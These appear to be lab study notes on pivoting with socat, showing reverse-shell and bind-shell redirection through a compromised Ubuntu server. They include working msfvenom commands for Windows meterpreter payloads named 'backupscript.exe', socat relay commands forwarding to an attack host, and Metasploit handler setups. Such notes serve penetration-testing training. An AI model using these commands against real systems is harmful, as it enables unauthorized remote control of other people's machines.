# Socat Redirection with a Reverse Shell
- [Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling.
- It acts as a redirector that can listen on one host and port and forward that data to another IP address and port.
#### Starting Socat Listener
```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
- Socat will listen on localhost on port `8080` and forward all the traffic to port `80` on our attack host i.e., our machine (10.10.14.18).
- Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server.
- We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.
#### Creating the Windows Payload
```shell-session
AnuragTaparia@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```
- Keep in mind that we must transfer this payload to the Windows host.

#### Configuring & Starting the multi/handler
```shell-session
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run
```

# Socat Redirection with a Bind Shell

- Similar to our socat's reverse shell redirector, we can also create a socat bind shell redirector. This is different from reverse shells that connect back from the Windows server to the Ubuntu server and get redirected to our attack host.
- In the case of bind shells, the Windows server will start a listener and bind to a particular port.
	- We can create a bind shell payload for Windows and execute it on the Windows host. 
	- At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target. 
#### Creating the Windows Payload
```shell-session
AnuragTaparia@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```
- We can start a `socat bind shell` listener, which listens on port `8080` and forwards packets to Windows server `8443`.
#### Starting Socat Bind Shell Listener
```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

- Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)
#### Configuring & Starting the Bind multi/handler
```shell-session
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp	
set RHOST 10.129.202.64
set LPORT 8080
run
```

- We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.

